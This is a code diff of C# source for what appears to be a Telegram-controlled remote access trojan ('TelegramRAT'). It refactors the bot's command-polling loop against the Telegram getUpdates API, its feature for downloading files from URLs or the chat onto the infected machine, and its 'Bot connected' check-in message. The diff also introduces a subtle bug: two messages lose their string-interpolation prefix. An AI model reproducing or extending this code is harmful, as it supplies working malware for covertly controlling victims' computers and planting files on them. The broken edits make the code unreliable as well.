@@ -49,7 +49,7 @@ namespace TelegramRAT
             int LastUpdateID = 0;
             string response;
             using (WebClient client = new WebClient())
-                response = client.DownloadString("https://api.telegram.org/bot" + config.TelegramToken + "/getUpdates");
+                response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates");
             LastUpdateID = JSON.Parse(response)["result"][0]["update_id"].AsInt;
 
             // Get commands
@@ -60,8 +60,9 @@ namespace TelegramRAT
                 //
                 waitForUnblock();
                 // Get commands
+                LastUpdateID++;
                 using (WebClient client = new WebClient())
-                    response = client.DownloadString("https://api.telegram.org/bot" + config.TelegramToken + "/getUpdates" + "?offset=" + (LastUpdateID + 1));
+                    response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates?offset={LastUpdateID}");
                 var json = JSON.Parse(response);
 
                 foreach (JSONNode r in json["result"].AsArray)
@@ -196,7 +197,7 @@ namespace TelegramRAT
             // Download file from url
             if (file.StartsWith("http"))
             {
-                sendText(String.Format("📄 Downloading file \"{0}\" from url", Path.GetFileName(file)));
+                sendText($"📄 Downloading file \"{Path.GetFileName(file)}\" from url");
                 try
                 {
                     using (WebClient client = new WebClient())
@@ -207,15 +208,15 @@ namespace TelegramRAT
                     return;
                 }
                 
-                sendText(String.Format("💾 File \"{0}\" saved in: \"{1}\"", file, Path.GetFullPath(Path.GetFileName(file))));
+                sendText($"💾 File \"{file}\" saved in: \"{Path.GetFullPath(Path.GetFileName(file))}\"");
             // Download file from chat
             } else
             {
-                sendText(String.Format("📄 Downloading file: \"{0}\"", file));
+                sendText("📄 Downloading file: \"{file}\"");
                 path = @"https://api.telegram.org/file/bot" + config.TelegramToken + "/" + path;
                 using (WebClient client = new WebClient())
                     client.DownloadFile(new Uri(path), file);
-                sendText(String.Format("💾 File \"{0}\" saved in: \"{1}\"", file, Path.GetFullPath(file)));
+                sendText("💾 File \"{file}\" saved in: \"{Path.GetFullPath(file)}\"");
             }   
         }
 
@@ -259,7 +260,7 @@ namespace TelegramRAT
         // Send connected
         public static void sendConnection()
         {
-            sendText("🍀 Bot online");
+            sendText("🍀 Bot connected");
         }
 
         
